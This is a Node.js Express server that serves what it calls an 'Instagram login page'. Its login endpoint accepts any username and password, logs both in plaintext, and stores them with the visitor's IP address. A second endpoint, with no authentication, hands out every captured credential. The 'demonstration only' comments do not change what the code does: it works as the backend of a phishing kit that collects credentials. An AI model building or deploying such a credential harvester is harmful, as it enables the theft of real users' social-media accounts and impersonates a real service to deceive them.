const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Store login attempts (in production, use a database)
const loginAttempts = [];

// Serve the login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login POST request
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    
    // Validate input
    if (!username || typeof username !== 'string' || username.trim().length === 0) {
        return res.status(400).json({
            success: false,
            message: 'Invalid username'
        });
    }
    
    if (!password || typeof password !== 'string' || password.trim().length === 0) {
        return res.status(400).json({
            success: false,
            message: 'Invalid password'
        });
    }
    
    // Log the login details to console (backend receives the data)
    // NOTE: For demonstration purposes only. In production, never log passwords!
    console.log('Login attempt received:');
    console.log('Username:', username);
    console.log('Password:', password); // WARNING: Password logging for demo only!
    console.log('Timestamp:', new Date().toISOString());
    console.log('-------------------');
    
    // Store the login attempt
    const loginData = {
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        ipAddress: req.ip || req.socket?.remoteAddress || 'unknown'
    };
    
    loginAttempts.push(loginData);
    
    // Send response
    res.json({
        success: true,
        message: 'Login details received',
        data: {
            username: username,
            timestamp: loginData.timestamp
        }
    });
});

// Get all login attempts (for viewing backend data)
// WARNING: In production, this endpoint should be protected with authentication!
// Currently exposes sensitive data for demonstration purposes only.
app.get('/api/login-attempts', (req, res) => {
    res.json({
        success: true,
        count: loginAttempts.length,
        attempts: loginAttempts
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    console.log('Instagram login page is ready!');
});
